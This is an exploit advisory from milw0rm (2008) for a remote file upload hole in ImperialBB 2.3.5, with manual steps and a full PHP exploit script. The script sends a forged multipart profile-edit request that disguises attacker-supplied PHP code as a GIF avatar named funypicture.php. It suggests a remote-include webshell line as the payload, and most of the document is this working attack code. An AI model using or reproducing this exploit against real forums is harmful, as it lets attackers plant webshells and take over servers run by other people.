@@ -1,0 +1,126 @@
+Title     :    ImperialBB <= 2.3.5 Remote File Upload Vulnerability
+Date      :    5th July 2008
+Found by  :    PHPLizardo - http://phplizardo.2gb.fr
+Greetz    :    Gu1ll4um3r0m41n
+
+Howto     :    1. Go to your User Control Panel
+               2. Upload any file you want
+               3. Tamper the request and change the mime-type to : image/gif
+               4. There is your file : http://site.com/[forum_path]/images/avatars/uploads/[your_nickname]_[filename].[ext]
+			   
+<?php
+/*
+
+	Title                 :   ImperialBB <= 2.3.5 Remote Upload Vulnerability
+	Date                  :   5th July 2008
+	Found by              :   PHPLizardo
+	
+	Description           :   This vulnerability can be used by a attacker to upload  a malicious script on the webserver.
+
+	Greetz                :   irc.worldnet.net #carib0u
+							  
+
+*/
+
+if(count($argv) == 5)
+{
+	echo "\n\n";
+	echo "+---------------------------------------------------------------+\r\n";
+	echo "|        ImperialBB <= 2.3.5 Remote Upload Vulnerability        |\r\n";
+	echo "|           By PHPLizardo - irc.worldnet.net #carib0u           |\r\n";
+	echo "|        Usage: php exploit.php site.com /path/ user pass       |\r\n";
+	echo "+---------------------------------------------------------------+\r\n";
+	echo "\n";
+		
+	echo "Code to write in the file (ie. <?php include(\$_GET['inc']); ?>) :\r\n\n";
+	$code     =   trim(fgets(STDIN));
+	
+	$socket   =   @fsockopen($argv[1], 80, $eno, $estr, 30);
+	if(!$socket)
+	{
+		die("Could not connect to ".$argv[1].". Operation aborted.");
+	}
+	
+	$part1      =   "POST " . $argv[2] . "profile.php?func=edit HTTP/1.1\r\n";
+	$part1     .=   "Host: " . $argv[1] . "\r\n";
+	$part1     .=   "Accept: */*\r\n";
+	$part1     .=   "Connection: Close\r\n";
+	$part1     .=   "Cookie: UserName=" . $argv[3] . "; Password=" . md5(md5($argv[4])) . "\r\n";
+	$part1     .=   "Content-Type: multipart/form-data; boundary=---------------------------200831142015814\r\n";
+	
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"Email\"\r\n\r\n";
+	$part2     .=   "test@test.test\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"Email2\"\r\n\r\n";
+	$part2     .=   "test@test.test\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"OldPass\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"PassWord\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"Pass2\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"signature\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"aim\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"icq\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"msn\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"yahoo\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"Remote_Avatar_URL\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"Upload_Avatar\"; filename=\"funypicture.php\"\r\n";
+	$part2     .=   "Content-Type: image/gif\r\n\r\n";
+	$part2     .=   $code."\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"month\"\r\n\r\n";
+	$part2     .=   "00\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"day\"\r\n\r\n";
+	$part2     .=   "00\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"year\"\r\n\r\n";
+	$part2     .=   "0000\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"website\"\r\n\r\n\r\n";
+
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"location\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"email_on_pm\"\r\n\r\n";
+	$part2     .=   "0\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"OldPass\"\r\n\r\n\r\n";
+	$part2     .=   "-----------------------------200831142015814\r\n";
+	$part2     .=   "Content-Disposition: form-data; name=\"Submit\"\r\n\r\n";
+	$part2     .=   "Submit\r\n";
+	$part2     .=   "-----------------------------200831142015814--\r\n";
+	
+	$part1     .=   "Content-Length: " . strlen($part2) . "\r\n\r\n";
+	
+	
+	
+	$part1     .=   $part2;
+	
+	fwrite($socket, $part1);
+	
+	echo "It might have worked, check if your file is online at -> http://" . $argv[1] . $argv[2] . "/images/avatars/uploads/" . $argv[3] . "_funypicture.php";
+	
+}
+else
+{
+	echo "\n\n";
+	echo "+----.-----------------------------------------------------------+\r\n";
+	echo "|        ImperialBB <= 2.3.5 Remote Upload Vulnerability        |\r\n";
+	echo "|           By PHPLizardo - irc.worldnet.net #carib0u           |\r\n";
+	echo "|        Usage: php exploit.php site.com /path/ user pass       |\r\n";
+	echo "+---------------------------------------------------------------+\r\n";
+	echo "\n\n";
+}
+?>
+
+# milw0rm.com [2008-07-05]
